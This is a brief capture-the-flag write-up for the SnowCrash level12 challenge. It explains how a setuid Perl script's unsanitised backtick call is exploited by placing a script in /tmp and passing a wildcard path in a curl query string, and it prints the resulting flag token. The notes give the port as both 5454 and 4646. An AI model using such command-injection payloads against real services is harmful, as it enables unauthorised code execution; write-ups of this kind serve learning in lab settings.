..level12@SnowCrash:~$ ls -la
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl

the exectuable takes 2 param (in URL), transforms the lowercase in uppercase and removes spaces


because of this, we can't do smt like " > /tmp/flag"

we can create "/tmp/MYFLAG", chmod 777 it
and use curl for a GET request on localhost:5454
with param x as /*/MYFLAG so it will exec the content of the file because of 
"@output = `egrep "^$xx" /tmp/xd 2>&1`;"
which execute the first argument

curl localhost:4646?x='`/*/MYFLAG`'

Broadcast Message from flag12@Snow                                             
        (somewhere) at 18:08 ...                                               
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr